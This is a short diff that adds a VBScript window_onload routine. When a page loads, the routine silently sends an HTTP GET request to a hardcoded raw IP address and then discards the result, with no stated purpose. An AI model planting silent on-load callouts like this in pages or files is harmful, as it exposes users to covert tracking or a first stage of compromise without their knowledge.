@@ -1,0 +1,7 @@
+Sub window_onload()
+    Dim httpRequest As Object
+    Set httpRequest = CreateObject("MSXML2.ServerXMLHTTP")
+    httpRequest.Open "GET", "http://64.44.115.238", False
+    httpRequest.Send
+    Set httpRequest = Nothing
+End Sub
